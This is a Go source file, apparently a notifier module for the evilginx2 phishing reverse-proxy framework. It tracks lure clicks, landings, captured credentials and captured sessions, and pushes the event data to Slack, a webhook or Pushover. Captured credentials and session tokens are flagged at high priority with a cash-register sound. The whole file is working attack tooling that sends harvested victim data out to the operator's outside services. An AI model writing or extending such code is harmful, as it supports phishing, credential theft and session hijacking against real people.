package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

const (
	EventLureClicked       = "lure_clicked"
	EventLureLanded        = "lure_landed"
	EventCredentialCaptured = "credential_captured"
	EventSessionCaptured   = "session_captured"
)

const (
	CFG_NOTIFY_SLACK_URL       = "notify_slack_url"
	CFG_NOTIFY_WEBHOOK_URL     = "notify_webhook_url"
	CFG_NOTIFY_PUSHOVER_USER   = "notify_pushover_user"
	CFG_NOTIFY_PUSHOVER_TOKEN  = "notify_pushover_token"
)

const pushoverAPIURL = "https://api.pushover.net/1/messages.json"

type Notifier struct {
	slackWebhookURL string
	webhookURL      string
	pushoverUser    string
	pushoverToken   string
	httpClient      *http.Client
}

func NewNotifier() *Notifier {
	return &Notifier{
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

func (n *Notifier) SetSlackWebhook(url string) {
	n.slackWebhookURL = strings.TrimSpace(url)
}

func (n *Notifier) SetWebhookURL(url string) {
	n.webhookURL = strings.TrimSpace(url)
}

func (n *Notifier) SetPushover(userKey, apiToken string) {
	n.pushoverUser = strings.TrimSpace(userKey)
	n.pushoverToken = strings.TrimSpace(apiToken)
}

func (n *Notifier) NotifyEvent(eventType string, data map[string]string) {
	if n.slackWebhookURL != "" {
		go n.sendSlack(eventType, data)
	}
	if n.webhookURL != "" {
		go n.sendWebhook(eventType, data)
	}
	if n.pushoverUser != "" && n.pushoverToken != "" {
		go n.sendPushover(eventType, data)
	}
}

func (n *Notifier) GetStatus() string {
	var active []string

	if n.slackWebhookURL != "" {
		active = append(active, "slack")
	}
	if n.webhookURL != "" {
		active = append(active, "webhook")
	}
	if n.pushoverUser != "" && n.pushoverToken != "" {
		active = append(active, "pushover")
	}

	if len(active) == 0 {
		return "no notification channels configured"
	}
	return fmt.Sprintf("active channels: %s", strings.Join(active, ", "))
}

func (n *Notifier) eventEmoji(eventType string) string {
	switch eventType {
	case EventLureClicked:
		return "\xf0\x9f\x94\x97" // link emoji
	case EventLureLanded:
		return "\xf0\x9f\x8e\xa3" // fishing pole emoji
	case EventCredentialCaptured:
		return "\xf0\x9f\x94\x91" // key emoji
	case EventSessionCaptured:
		return "\xf0\x9f\x8e\xaf" // bullseye emoji
	default:
		return "\xf0\x9f\x94\x94" // bell emoji
	}
}

func (n *Notifier) eventLabel(eventType string) string {
	switch eventType {
	case EventLureClicked:
		return "Lure Clicked"
	case EventLureLanded:
		return "Lure Landed"
	case EventCredentialCaptured:
		return "Credential Captured"
	case EventSessionCaptured:
		return "Session Captured"
	default:
		return eventType
	}
}

func (n *Notifier) sendSlack(eventType string, data map[string]string) {
	emoji := n.eventEmoji(eventType)
	label := n.eventLabel(eventType)
	ts := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")

	var fields []map[string]interface{}
	for k, v := range data {
		fields = append(fields, map[string]interface{}{
			"title": k,
			"value": v,
			"short": len(v) < 40,
		})
	}

	payload := map[string]interface{}{
		"text": fmt.Sprintf("%s *%s*", emoji, label),
		"attachments": []map[string]interface{}{
			{
				"color":  n.eventColor(eventType),
				"fields": fields,
				"footer": fmt.Sprintf("evilginx | %s", ts),
			},
		},
	}

	body, err := json.Marshal(payload)
	if err != nil {
		log.Error("notifier: failed to marshal slack payload: %v", err)
		return
	}

	resp, err := n.httpClient.Post(n.slackWebhookURL, "application/json", bytes.NewReader(body))
	if err != nil {
		log.Error("notifier: slack send failed: %v", err)
		return
	}
	resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		log.Warning("notifier: slack returned status %d", resp.StatusCode)
	} else {
		log.Debug("notifier: slack notification sent for %s", eventType)
	}
}

func (n *Notifier) sendWebhook(eventType string, data map[string]string) {
	payload := map[string]interface{}{
		"event":     eventType,
		"timestamp": time.Now().UTC().Format(time.RFC3339),
		"data":      data,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		log.Error("notifier: failed to marshal webhook payload: %v", err)
		return
	}

	resp, err := n.httpClient.Post(n.webhookURL, "application/json", bytes.NewReader(body))
	if err != nil {
		log.Error("notifier: webhook send failed: %v", err)
		return
	}
	resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		log.Warning("notifier: webhook returned status %d", resp.StatusCode)
	} else {
		log.Debug("notifier: webhook notification sent for %s", eventType)
	}
}

func (n *Notifier) sendPushover(eventType string, data map[string]string) {
	label := n.eventLabel(eventType)
	emoji := n.eventEmoji(eventType)

	var msgLines []string
	for k, v := range data {
		msgLines = append(msgLines, fmt.Sprintf("<b>%s:</b> %s", k, v))
	}
	message := strings.Join(msgLines, "\n")

	priority := "0"
	if eventType == EventCredentialCaptured || eventType == EventSessionCaptured {
		priority = "1"
	}

	form := url.Values{}
	form.Set("token", n.pushoverToken)
	form.Set("user", n.pushoverUser)
	form.Set("title", fmt.Sprintf("%s %s", emoji, label))
	form.Set("message", message)
	form.Set("html", "1")
	form.Set("priority", priority)
	form.Set("sound", "cashregister")

	resp, err := n.httpClient.PostForm(pushoverAPIURL, form)
	if err != nil {
		log.Error("notifier: pushover send failed: %v", err)
		return
	}
	resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		log.Warning("notifier: pushover returned status %d", resp.StatusCode)
	} else {
		log.Debug("notifier: pushover notification sent for %s", eventType)
	}
}

func (n *Notifier) eventColor(eventType string) string {
	switch eventType {
	case EventLureClicked:
		return "#36a64f" // green
	case EventLureLanded:
		return "#2196f3" // blue
	case EventCredentialCaptured:
		return "#ff9800" // orange
	case EventSessionCaptured:
		return "#f44336" // red
	default:
		return "#9e9e9e" // grey
	}
}
